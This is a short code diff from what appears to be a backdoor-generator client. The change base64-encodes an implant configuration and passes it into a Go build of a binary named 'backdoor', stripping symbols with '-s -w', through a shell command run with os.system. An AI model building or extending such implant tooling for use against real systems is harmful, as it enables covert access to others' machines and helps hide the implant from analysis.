@@ -2,6 +2,7 @@
 import argparse
 import os
 import shutil
+from base64 import b64encode
 from tempfile import TemporaryDirectory
 
 from shameleon_client.profile import Profile
@@ -98,11 +99,11 @@ def main():
         # Build config
         print("[*] Building config")
         config = chosen_profile.serialize_for_backdoor()
-        escaped_config = config.replace('"', '\\"')
+        encoded_config = b64encode(config.encode('utf-8')).decode('utf-8')
 
         # Build backdoor
         print("[*] Building backdoor")
-        flags = f'-ldflags="-X main.config={escaped_config}"'
+        flags = f'-ldflags="-s -w -X main.rawConfig={encoded_config}"'
         cmd = f'cd {tmp_dir} && GOOS={args.os} go build {flags} -o backdoor'
         print('[.] ' + cmd)
         os.system(cmd)
